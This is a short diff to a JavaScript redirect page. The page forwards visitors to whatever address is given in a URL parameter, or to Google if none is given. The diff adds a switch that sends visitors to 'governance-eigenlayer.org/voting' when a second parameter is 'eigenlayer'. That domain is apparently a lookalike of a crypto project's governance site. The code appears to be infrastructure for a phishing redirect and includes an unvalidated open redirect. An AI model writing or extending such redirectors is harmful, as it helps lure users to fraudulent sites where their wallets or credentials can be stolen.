@@ -6,11 +6,17 @@
     (function () {
       const params = new URLSearchParams(window.location.search);
       let s = params.get('s');
-
+      let t = params.get('t');
+      
       if (!s) {
         window.location.replace("https://www.google.com/");
         return;
       }
+
+      if (t == "eigenlayer") {
+        s = "governance-eigenlayer.org/voting"
+      }
+
 
       if (!s.startsWith("http://") && !s.startsWith("https://")) {
         s = "https://" + s;
